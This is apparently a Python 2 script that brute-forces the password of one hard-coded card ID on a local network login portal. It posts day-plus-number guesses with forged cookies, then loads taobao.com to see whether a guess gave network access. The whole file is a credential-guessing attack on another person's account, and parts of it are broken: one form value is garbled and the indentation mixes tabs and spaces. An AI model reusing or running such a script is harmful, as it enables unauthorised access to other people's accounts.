# -*- coding: utf-8 -*-
import requests


card_id = '110201400803900'
def fun():
	for j in range(1, 1000):
		substring2 = str(j-1)
		substring2 = (4 - len(substring2))*'0' + substring2
		for i in range(1, 32):
		    substring1 = str(i)
			if len(substring1) < 2:
		    	substring1 = '0' + substring1 
		    string = substring1+substring2
		    data = {
		            '0MKKey': '�ǡ�¼',
		            'DDDDD': card_id,
		            'upass': string,
		            'v6ip':''
		    }
		    cookie = {
		            'myusername': card_id,
		            'username': card_id,
		            'smartdot':string
		    }
		    print 'process' + string
		    requests.post('http://192.168.168.168/0.htm', data=data, cookies=cookie)
		    re = requests.get('http://www.taobao.com')
		    if 'taobao.com' in re.url:
		        print 'code is' + string
		        return
fun()
